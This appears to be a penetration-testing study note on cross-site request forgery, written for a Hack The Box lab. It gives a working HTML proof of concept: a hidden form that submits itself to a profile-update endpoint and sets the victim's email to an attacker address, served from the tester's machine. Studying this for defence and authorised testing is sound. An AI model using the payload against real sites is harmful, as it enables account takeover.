---
title: e-CSRF
draft: false
tags:
  - csrf
---
CSRF or XSRF is an attack that forces and end-user to execute inadvertent actions on a web app in which they are currently authenticated.

This is usually done with attacker-crafted web pages that the victim must visit or interact with.

A web application is vulnerable to CSRF attacks when:

- All the parameters required for the targeted request can be determined or guessed by the attacker
- The application's session management is solely based on HTTP cookies, which are automatically included in browser requests

To successfully exploit a CSRF vulnerability, we need:

- To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
- The victim to be logged into the application at the time when the malicious cross-site request is issued

In your web application penetration testing or bug bounty hunting endeavors, you will notice a lot of applications that feature no anti-CSRF protections or anti-CSRF protections that can be easily bypassed.

## Exploitation

> Let's say a victim log-in to web app where he/she can update profile (email, telephone, country). 

Intercepting the update traffic, we notice there is no anti-CSRF token in it.

Let's try CSRF attack that will change the victim's profile details by simply visiting another website.

First, create and serve the below HTML page. Save it as `notmalicious.html`

```html
<html>
  <body>
    <form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

We can serve the page above from our attacking machine as follows.

```shell-session
jadu101@htb[/htb]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

While still logged in as victim, open a new tab and visit the page you are serving from your attacking machine `http://<VPN/TUN Adapter IP>:1337/notmalicious.html`. You will notice that victim's profile details will change to the ones we specified in the HTML page we are serving.

Next, we will cover how we can attack applications that feature anti-CSRF mechanisms.